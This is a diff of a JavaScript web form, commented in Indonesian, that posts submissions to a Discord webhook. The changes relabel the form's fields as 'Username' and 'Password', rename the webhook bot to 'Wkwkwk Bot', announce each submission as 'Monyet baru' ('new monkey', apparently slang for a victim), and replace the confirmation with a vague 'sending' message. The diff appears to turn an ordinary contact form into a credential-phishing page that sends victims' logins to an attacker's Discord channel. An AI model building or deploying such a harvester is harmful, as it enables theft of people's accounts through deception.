@@ -19,13 +19,13 @@
 
             // 2. Validasi Input (Nama tidak boleh kosong)
             if (nama === "") {
-                alert("Nama tidak boleh kosong!");
+                alert("Username tidak boleh kosong!");
                 return; // Hentikan proses jika validasi gagal
             }
 
             // --- VALIDASI BARU: Pesan tidak boleh kosong ---
             if (pesan === "") {
-                alert("Pesan Tambahan tidak boleh kosong! Mohon isi pesan Anda.");
+                alert("Password tidak boleh kosong.");
                 return; // Hentikan proses jika validasi gagal
             }
             // ---------------------------------------------
@@ -40,9 +40,9 @@
             // 3. Data valid, buat payload untuk Discord
             const payload = {
                 // Ganti nama pengguna Webhook (opsional)
-                username: "Formulir Web App",
+                username: "Wkwkwk Bot",
                 // 'content' adalah pesan utama yang akan muncul di Discord
-                content: `🚨 **[Notifikasi Formulir Baru]**`, 
+                content: `🚨 **[Monyet baru]**`, 
                 // 'embeds' digunakan untuk membuat tampilan pesan lebih rapi dan terstruktur
                 embeds: [{
                     title: "Detail Pengiriman Formulir",
@@ -77,7 +77,7 @@
             .then(response => {
                 // 5. Penanganan Respons
                 if (response.ok) {
-                    alert('Formulir berhasil dikirim ke Discord! Cek channel Anda.');
+                    alert('Proses Pengiriman 🚛🚛');
                     document.getElementById("myForm").reset(); 
                 } else if (response.status === 400) {
                     // Seringkali 400 Bad Request berarti payload JSON salah atau URL Webhook rusak/salah
